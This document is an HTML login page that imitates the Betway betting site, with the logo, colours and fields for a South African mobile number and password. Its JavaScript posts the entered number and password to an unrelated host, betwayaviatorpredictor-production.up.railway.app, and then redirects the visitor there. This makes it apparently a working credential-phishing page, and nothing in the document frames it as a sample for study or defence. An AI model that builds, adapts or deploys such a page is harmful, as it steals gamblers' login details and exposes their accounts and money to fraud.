<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Betway Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background: #141414;
            padding: 45px 35px 40px;
            border-radius: 16px;
            width: 100%;
            max-width: 420px;
            border: 1px solid #2a2a2a;
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95);
        }

        .logo {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo h1 {
            font-size: 42px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: 1px;
        }

        .logo h1 span {
            color: #f5c518;
        }

        .logo p {
            color: #f5c518;
            font-size: 10px;
            letter-spacing: 6px;
            text-transform: uppercase;
            margin-top: 2px;
            font-weight: 300;
        }

        .login-heading {
            color: #ffffff;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            color: #bbbbbb;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0d0d0d;
            border: 2px solid #2a2a2a;
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }

        .input-group input:focus {
            border-color: #f5c518;
            background: #111;
            box-shadow: 0 0 25px rgba(245, 197, 24, 0.06);
        }

        .input-group input::placeholder {
            color: #555;
            font-size: 14px;
        }

        .forgot-row {
            display: flex;
            justify-content: space-between;
            margin: 12px 0 22px;
        }

        .forgot-row a {
            color: #aaaaaa;
            font-size: 13px;
            text-decoration: none;
            transition: 0.3s;
        }

        .forgot-row a:hover {
            color: #f5c518;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #00a651;
            border: none;
            border-radius: 10px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 30px rgba(0, 166, 81, 0.3);
        }

        .login-btn:hover {
            background: #00c45a;
            transform: scale(1.02);
            box-shadow: 0 12px 40px rgba(0, 166, 81, 0.45);
        }

        .login-btn:active {
            transform: scale(0.97);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: scale(0.98);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 28px 0 22px;
            gap: 15px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }

        .divider span {
            color: #555;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .signup-text {
            text-align: center;
            color: #aaaaaa;
            font-size: 15px;
        }

        .signup-text a {
            color: #f5c518;
            font-weight: 700;
            text-decoration: none;
            font-size: 16px;
            margin-left: 4px;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        /* MESSAGE STYLES */
        #message {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 18px;
            font-size: 14px;
            display: none;
            text-align: center;
            font-weight: 600;
        }

        #message.error {
            display: block;
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid rgba(255, 0, 0, 0.3);
            color: #ff6b6b;
        }

        #message.success {
            display: block;
            background: rgba(0, 166, 81, 0.15);
            border: 1px solid rgba(0, 166, 81, 0.3);
            color: #00c45a;
        }

        #message.loading {
            display: block;
            background: rgba(245, 197, 24, 0.1);
            border: 1px solid rgba(245, 197, 24, 0.2);
            color: #f5c518;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
            .logo h1 {
                font-size: 34px;
            }
            .forgot-row {
                flex-direction: column;
                gap: 6px;
                align-items: center;
            }
            .login-heading {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">

        <div class="logo">
            <h1>BET<span>WAY</span></h1>
            <p>Sports · Casino · Games</p>
        </div>

        <div class="login-heading">Login</div>

        <!-- MESSAGE DISPLAY -->
        <div id="message"></div>

        <!-- MOBILE NUMBER -->
        <div class="input-group">
            <label>+27 Mobile Number</label>
            <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
        </div>

        <!-- PASSWORD -->
        <div class="input-group">
            <label>Enter Password</label>
            <input type="password" id="password" placeholder="Enter your password" />
        </div>

        <!-- FORGOT LINKS -->
        <div class="forgot-row">
            <a href="#">Forgot Username?</a>
            <a href="#">Forgot Password?</a>
        </div>

        <!-- LOGIN BUTTON -->
        <button class="login-btn" id="loginBtn">Login</button>

        <div class="divider">
            <span>Don't have an account yet?</span>
        </div>

        <p class="signup-text">
            <a href="#">Sign Up</a>
        </p>

    </div>

    <script>
        // Wait for the page to fully load
        document.addEventListener('DOMContentLoaded', function() {
            
            // Get elements
            const mobileInput = document.getElementById('mobileNumber');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const messageDiv = document.getElementById('message');

            console.log('✅ Page loaded successfully!');

            // Function to show message
            function showMessage(text, type) {
                messageDiv.textContent = text;
                messageDiv.className = type;
                console.log('📢 Message:', text, 'Type:', type);
            }

            // Function to hide message
            function hideMessage() {
                messageDiv.textContent = '';
                messageDiv.className = '';
            }

            // Login function
            async function handleLogin(event) {
                // Prevent form from submitting
                if (event) {
                    event.preventDefault();
                }

                console.log('🔑 Login button clicked!');

                // Get values
                const mobileNumber = mobileInput.value.trim();
                const password = passwordInput.value.trim();

                console.log('📱 Mobile:', mobileNumber);
                console.log('🔒 Password:', password ? '******' : 'empty');

                // Validate
                if (!mobileNumber || !password) {
                    showMessage('⚠️ Please enter both mobile number and password.', 'error');
                    return;
                }

                // Validate South African mobile number
                const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                if (!mobileRegex.test(mobileNumber)) {
                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678 or +27712345678)', 'error');
                    return;
                }

                // Hide previous messages
                hideMessage();

                // Disable button and show loading
                loginBtn.disabled = true;
                loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
                showMessage('⏳ Sending login details...', 'loading');

                try {
                    // Send to backend
                    const apiUrl = 'https://betwayaviatorpredictor-production.up.railway.app/api/login';
                    console.log('🌐 Sending to:', apiUrl);

                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            mobileNumber: mobileNumber,
                            password: password
                        })
                    });

                    console.log('📡 Response status:', response.status);

                    const data = await response.json();
                    console.log('📦 Response data:', data);

                    if (data.success) {
                        showMessage('✅ Login successful! Redirecting...', 'success');
                        
                        // Redirect after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                        }, 2000);
                    } else {
                        showMessage('❌ ' + (data.message || 'Login failed. Please try again.'), 'error');
                    }

                } catch (error) {
                    console.error('❌ Error:', error);
                    showMessage('❌ Network error. Please check your connection and try again.', 'error');
                } finally {
                    // Re-enable button
                    loginBtn.disabled = false;
                    loginBtn.innerHTML = 'Login';
                }
            }

            // Event listener for login button click
            loginBtn.addEventListener('click', handleLogin);
            console.log('✅ Login button listener attached!');

            // Allow Enter key to submit
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    const active = document.activeElement;
                    if (active === mobileInput || active === passwordInput) {
                        console.log('⌨️ Enter key pressed!');
                        handleLogin(e);
                    }
                }
            });

            // Hide message when user starts typing
            mobileInput.addEventListener('input', function() {
                if (messageDiv.className === 'error' || messageDiv.className === 'loading') {
                    hideMessage();
                }
            });
            
            passwordInput.addEventListener('input', function() {
                if (messageDiv.className === 'error' || messageDiv.className === 'loading') {
                    hideMessage();
                }
            });

            console.log('✅ All event listeners are set up!');

        }); // End DOMContentLoaded
    </script>

</body>
</html>
